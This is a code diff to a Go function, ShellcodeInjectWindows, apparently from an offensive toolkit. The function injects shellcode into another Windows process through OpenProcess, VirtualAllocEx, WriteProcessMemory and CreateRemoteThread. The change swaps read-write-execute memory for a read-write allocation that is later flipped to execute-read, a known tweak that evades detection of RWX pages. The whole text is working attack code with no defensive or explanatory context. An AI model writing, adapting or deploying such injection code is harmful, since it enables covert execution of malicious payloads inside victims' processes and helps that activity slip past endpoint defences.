@@ -35,17 +35,20 @@ func ShellcodeInjectWindows(sc []byte, pid int) error {
 
 	OpenProcess := kernel32.NewProc("OpenProcess")
 	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
 	CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
 
 	const PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
 	const MEM_COMMIT = 0x1000
 	const MEM_RESERVE = 0x2000
-	const PAGE_EXECUTE_READWRITE = 0x40
-
+	const PAGE_READWRITE = 0x04
+	const PAGE_EXECUTE_READ = 0x20
 	proc_handle, _, _ := OpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
-	remote_buf, _, _ := VirtualAllocEx.Call(proc_handle, 0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	remote_buf, _, _ := VirtualAllocEx.Call(proc_handle, 0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	WriteProcessMemory.Call(proc_handle, remote_buf, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
+	var oldperms uint32
+	VirtualProtectEx.Call(proc_handle, remote_buf, uintptr(len(sc)), PAGE_EXECUTE_READ, (uintptr)(unsafe.Pointer(&oldperms)));
 	CreateRemoteThread.Call(proc_handle, 0, 0, remote_buf, 0, 0, 0)
 			
 	return nil
